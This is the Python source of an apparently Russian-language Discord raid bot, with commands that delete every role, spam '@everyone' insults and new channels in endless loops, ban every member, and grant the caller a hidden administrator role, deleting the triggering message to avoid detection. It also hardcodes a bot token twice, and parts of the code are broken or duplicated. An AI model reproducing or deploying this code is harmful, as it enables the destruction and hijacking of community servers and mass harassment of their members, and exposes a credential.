import discord
from discord.ext import commands
from asyncio import sleep
from discord.utils import get
#импортиррую

import discord
from discord.ext import commands

async def on_ready():
    print('Logged on as {0}!'.format(self.user))

TOKEN = 'OTI3MTI3NjMxMzc4MzgyOTI4.YdFs5A.h0zjZQz6-lWttA7gNrgbZkcP5aU'


bot = commands.Bot(command_prefix='!')

@bot.command()
async def drole(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="None")
        except:
            pass

@bot.command()
async def stext(ctx):
    await ctx.message.delete() #удаляем сообщение пользователя, чтобы не спалился
    count = 0
    while 10000000000000000000:
        await ctx.send("@everyone АДМИНЫ ЛОХИ") #отправка текста
        count += 10000000000000000000

@bot.command()
async def ctext(ctx):
    await ctx.message.delete()
    count1 = 0
    while 10000000000000000000:
        guild = ctx.message.guild
        await guild.create_text_channel('АДМИНЫ-ЛОХИ')
        count1 += 10000000000000000000 

@bot.command()
async def aban(ctx):
    for m in ctx.guild.members: #собираем
        try:
            await m.ban(reason="По просьбе")#баним
        except:
            pass

@bot.command(pass_context=True)  # разрешаем передавать агрументы
async def Ahack(ctx):  # создаем асинхронную фунцию бота
    
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) #права роли
    await guild.create_role(name="AdminHack", permissions=perms) #создаем роль
    
    role = discord.utils.get(ctx.guild.roles, name="AdminHack") #находим роль по имени
    user = ctx.message.author #находим юзера
    await user.add_roles(role) #добовляем роль
    
    await ctx.message.delete()

async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user. id)
    print('------')


bot.run('OTI3MTI3NjMxMzc4MzgyOTI4.YdFs5A.h0zjZQz6-lWttA7gNrgbZkcP5aU')
